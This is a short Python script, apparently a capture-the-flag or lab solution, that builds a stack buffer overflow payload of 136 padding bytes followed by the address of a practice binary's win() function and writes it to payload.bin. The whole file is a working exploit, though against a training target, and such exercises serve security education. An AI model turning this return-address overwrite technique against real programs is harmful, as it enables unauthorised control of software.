#!/usr/bin/env python3
import sys
import struct

offset = 136
win_addr = 0x4012d6

payload = b"A" * offset + struct.pack("<Q", win_addr)

with open("payload.bin", "wb") as f:
    f.write(payload)

print(f"[+] offset: {offset}, win() addr: {hex(win_addr)}, wrote payload.bin ({len(payload)} bytes)")
